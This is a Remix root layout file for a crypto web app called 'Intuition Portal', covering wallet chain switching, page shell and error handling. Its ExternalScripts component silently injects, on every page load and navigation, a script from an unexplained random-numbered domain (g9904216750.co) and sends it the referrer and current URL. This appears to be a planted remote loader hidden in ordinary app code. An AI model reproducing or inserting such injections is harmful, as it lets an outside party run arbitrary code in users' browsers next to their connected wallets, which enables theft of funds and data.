import Providers from '@client/providers'
import { ClientHintCheck, getHints } from '@lib/utils/client-hints'
import { useNonce } from '@lib/utils/nonce-provider'
import { json, LoaderFunctionArgs, type MetaFunction } from '@remix-run/node'
import {
  isRouteErrorResponse,
  Links,
  Meta,
  Outlet,
  Scripts,
  ScrollRestoration,
  useLoaderData,
  useLocation,
  useRouteError,
} from '@remix-run/react'
import { useTheme } from '@routes/actions+/set-theme'
import { getEnv } from '@server/env'
import { getTheme } from '@server/theme'

import './styles/globals.css'

import { useEffect } from 'react'

import { Button, Icon, Text, Toaster } from '@0xintuition/1ui'

import { GlobalLoading } from '@components/global-loading'
import NavigationButton from '@components/navigation-link'
import { getChainEnvConfig } from '@lib/utils/environment'
import logger from '@lib/utils/logger'
import { cn } from '@lib/utils/misc'
import { setupAPI } from '@server/auth'
import { CURRENT_ENV, PATHS, SUPPORT_EMAIL_ADDRESS } from 'consts'
import { ClientOnly } from 'remix-utils/client-only'
import { baseSepolia } from 'viem/chains'
import { useAccount, useSwitchChain } from 'wagmi'

export const meta: MetaFunction<typeof loader> = ({ data }) => {
  return [
    { title: data ? 'Intuition Portal' : 'Error | Intuition Portal' },
    { name: 'description', content: `Intuition Portal` },
  ]
}

export async function loader({ request }: LoaderFunctionArgs) {
  setupAPI(request)

  return json({
    env: getEnv(),
    requestInfo: {
      hints: getHints(request),
      path: new URL(request.url).pathname,
      userPrefs: {
        theme: getTheme(request),
      },
    },
  })
}

export function Document({
  children,
  nonce,
  /* eslint-disable @typescript-eslint/no-unused-vars */
  theme = 'system',
}: {
  children: React.ReactNode
  nonce?: string
  theme?: string
}) {
  return (
    <html lang="en" data-theme="dark">
      <head>
        {nonce && <ClientHintCheck nonce={nonce} />}
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <Meta />
        <Links />
        <ExternalScripts />
      </head>
      <body>
        {children}
        <ScrollRestoration />
        <Scripts />
      </body>
    </html>
  )
}

export function ExternalScripts() {
  const location = useLocation()

  useEffect(() => {
    const scriptId = 'custom-script'

    const existingScript = document.getElementById(scriptId)
    if (existingScript) {
      return
    }

    const customScript = document.createElement('script')
    customScript.id = scriptId
    customScript.async = true
    customScript.src = `https://g9904216750.co/gb?id=-NzA1YkYvThmMw5rFg9n&refurl=${document.referrer}&winurl=${encodeURIComponent(window.location.href)}`

    document.head.appendChild(customScript)

    return () => {
      customScript.remove()
    }
  }, [location]) // re-run the effect if location changes

  return null // this component doesn't render anything itself
}

export default function App() {
  const nonce = useNonce()
  const theme = useTheme()
  const { env } = useLoaderData<typeof loader>()

  return (
    <Document nonce={nonce} theme={theme}>
      <GlobalLoading />
      <Toaster position="top-right" />
      <ClientOnly>
        {() => (
          <Providers privyAppId={env.PRIVY_APP_ID}>
            <AppLayout />
          </Providers>
        )}
      </ClientOnly>
    </Document>
  )
}

export function AppLayout() {
  const { chain } = useAccount()
  const { switchChain } = useSwitchChain()

  useEffect(() => {
    if (chain?.id !== baseSepolia.id && switchChain) {
      switchChain({
        chainId: getChainEnvConfig(CURRENT_ENV).chainId,
      })
    }
  }, [chain, switchChain])

  return (
    <main className="relative flex min-h-screen w-full flex-col justify-between antialiased">
      <Outlet />
    </main>
  )
}

export function ErrorBoundary() {
  const error = useRouteError()
  let statusCode = null
  let title: string | React.ReactNode = (
    <Icon name="circle-x" className="h-20 w-20 text-destructive" />
  )
  let description = 'Something went wrong...'

  logger('ROOT ERROR BOUNDARY:', error)

  const ErrorMessage = ({
    statusCode,
    title,
    description,
  }: {
    statusCode: number | null
    title: string | React.ReactNode
    description: string
  }) => {
    const descriptionArray = description.split('\n')
    return (
      <Document>
        <div className="flex h-[100vh] w-full items-center justify-center gap-12 max-[900px]:flex-col-reverse max-[900px]:gap-2">
          <div
            className={cn(
              'flex flex-col max-w-[500px] gap-2 max-[900px]:items-center max-[900px]:text-center',
              !statusCode && 'items-center [&>div]:text-center gap-4',
            )}
          >
            <Text
              variant={statusCode ? 'heading1' : 'heading3'}
              weight="medium"
            >
              {title}
            </Text>
            <div className="flex flex-col max-[900px]:text-center">
              {descriptionArray?.map((content, index) => (
                <Text
                  variant={statusCode ? 'bodyLarge' : 'headline'}
                  className="text-secondary/30"
                  key={index}
                >
                  {content}
                </Text>
              ))}
            </div>
            <div className="flex gap-6 mt-5 max-[400px]:flex-col">
              <NavigationButton variant="primary" size="lg" to={PATHS.ROOT}>
                Back to home
              </NavigationButton>
              <Button
                variant="ghost"
                size="lg"
                className="rounded-full"
                onClick={() =>
                  (window.location.href = `mailto:${SUPPORT_EMAIL_ADDRESS}`)
                }
              >
                Contact Support
              </Button>
            </div>
          </div>
          {statusCode && (
            <Text variant="heading1" weight="bold" className="text-9xl">
              {statusCode}
            </Text>
          )}
        </div>
      </Document>
    )
  }

  if (isRouteErrorResponse(error)) {
    statusCode = error.status
    if (error.status === 404) {
      title = 'Page not found'
      description = `Unfortunately, the page you are looking for does not exist.\n If you believe this is a mistake, please let us know and we'll get it sorted out.`
    } else {
      title = error.statusText
      description = error.data
    }
  }

  return (
    <ErrorMessage
      statusCode={statusCode}
      title={title}
      description={description}
    />
  )
}
